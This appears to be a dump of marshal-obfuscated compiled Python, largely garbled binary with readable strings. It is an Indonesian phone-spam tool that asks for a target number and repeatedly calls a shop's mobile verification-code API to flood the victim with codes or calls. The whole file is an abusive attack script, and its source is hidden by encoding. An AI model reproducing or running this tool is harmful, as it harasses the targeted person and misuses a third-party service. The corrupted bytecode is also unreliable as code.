�

�p_c           @   s!   d  d l  Z  e  j d � d Ud S(   i����Ns�

  �                   @   sp   d dl Z d dlZd dlZe�� Ze�de�ZG dd� d�Zdd� Zdd� Z	d	d� Z

edkrle�  e	�  e

�  dS )�    Nz%H:%M:%Sc                   @   s0   e Zd ZdZdZdZdZdZdZdZ	dZ

d	Zd

S )�wz[1;31mz[1;36mz[1;33mz[1;32mz[1;35mz[1;37mz[1;90mz[1;34mz[1;96mN)�__name__�

__module__�__qualname__�m�b�k�h�u�p�iZut�c� r   r   � r   	   s   r   c                   C   s$   t tj� dtj� dtj� d�� d S )NuC   ╔═╗╔═╗╔═╗╔╦╗  ╔═╗╔═╗╦  ╦  

u?   ╚═╗╠═╝╠═╣║║║  ║  ╠═╣║  ║  

u@   ╚═╝╩  ╩ ╩╩ ╩  ╚═╝╩ ╩╩═╝╩═╝)�printr   r   r   r

   r   r   r   r   �banner   s

    

��r   c                &   C   s�   t dtj� dtj� dtj� dtj� dtj� dtj� dtj� dtj� dtj� dtj� dtj� dtj� d	tj� dtj� dtj� dtj� d

tj� dtj� d�%� d S )Nz

�[u   •�] zAuthor z: zJejak internet

zNama Sc zcall unlimited

zGithub zhttps://github.com/hadapan

)r   r   r   r   r   r	   r   r   r   r   �	subbanner   sJ    ������������������r   c                  C   s�  d} ddi}t ttj� dtj� t� tj� dtj� dtj� dtj� dtj� dtj� dtj� ���}t�	d	| d

g�}t

ttj� dtj� t� tj� dtj� dtj� dtj� dtj� dtj� dtj� ���}|dk�rttj� dtj� t� tj� dtj� dtj� d

tj� dtj� d�� t

�  �nl�zt|�D ]�}t�� }|j| ||d�j}d|k�r�ttj� dtj� t� tj� dtj� dtj� dtj� dtj� d|� �� n�d|k�r�ttj� dtj� t� tj� dtj� dtj� dtj� d�� nFttj� dtj� t� tj� dtj� dtj� dtj� dtj� d|� �� �q(W n\ tjjk

�r�   ttj� dtj� t� tj� dtj� dtj� d

tj� dtj� d�� Y nX d S )Nz:https://api.vader-api.com/account/sendmobilecodeasync.jsonz

user-agentzzMozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36r   r   ZINPUTz&Masukkan nomor target (contoh:881xxx) z> Z62z

Vader ShopzMasukkan jumlah spam (max:25) �   ZERRORz Jumlah terlalu besar, maks 25!!!)Zheaders�dataZGagalZGAGALzSpam ke ZharizLimit harian coba lagi 1x24 jam�]ZSUKSESzInternet Error!!!)�str�inputr   r   r

   �tr	   r

   �json�dumps�intr   r   �main�range�requestsZSessionZpost�textr   Z

exceptions�ConnectionError)ZurlZhdZnoZdatZjumZspam�rZmulair   r   r   r   #   s&    TT

B



H

<N r   �__main__)r    r   �time�	localtimeZti�strftimer   r   r   r   r   r   r   r   r   r   �<module>   s    (   t   marshalt   loads(    (    (    s   /sdcard/call_enc.pyt   <module>   s   
